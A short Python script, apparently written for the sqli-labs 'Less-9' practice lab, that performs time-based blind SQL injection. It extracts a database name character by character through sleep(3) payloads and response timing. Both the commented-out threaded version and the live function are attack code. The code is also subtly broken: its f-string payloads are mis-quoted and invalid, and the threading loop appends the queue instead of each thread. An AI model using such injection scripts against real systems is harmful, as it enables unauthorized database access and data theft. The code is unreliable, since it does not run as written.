# import requests
# import threading
# import datetime
# from queue import Queue
#
#
# class time_inj(threading.Thread):
#     def __init__(self, queue):
#         threading.Thread.__init__(self)
#         self.queue = queue
#
#     def run(self):
#         global res
#         queue = self.queue
#         while not queue.empty():
#             info = queue.get()
#             num = info[0]
#             word = info[1]
#             payload = f'http://192.168.100.100:8080/Less-9/?id=1' and if(ascii(substr((select database()),{num},1))={word},sleep(3),1)--+'
#             start_time = datetime.datetime.now()
#             res = s.get(url=payload)
#             end_time = datetime.datetime.now()
#             t = (end_time - start_time).seconds
#             if t > 3:
#                 res += chr(word)
#                 print(res)
#
#
# def start():
#     queue = Queue()
#     for i in range(50):
#         for j in range(32, 127):
#             queue.put([i, j])
#
#     thread_count = 16
#     threads = []
#
#     for i in range(0, thread_count):
#         thread = time_inj(queue)
#         thread.start()
#         threads.append(queue)
#
#     for thread in threads:
#         thread.join()
#
#
# if __name__ == '__main__':
#     res = ''
#     s = requests.session()
#     start()
import requests
import datetime


def database_name():
    name = ''
    url = 'http://192.168.100.100:8080/Less-9/'
    for j in range(1, 20):
        for i in '0123456789abcdefghijklmnopqrstuvwxyz':
            payload = url + f'?id=1' and (if(substr((select database()),{j},1)='{i}',sleep(3),1))--+'

            time_start = datetime.datetime.now()
            print(payload)
            print('正在测试第' + str(j) + '位')

            response = requests.get(url=payload)

            time_end = datetime.datetime.now()

            t = (time_end - time_start).seconds

            if t >= 3:
                name += i
                break
            else:
                pass

    print(name)


print(database_name())

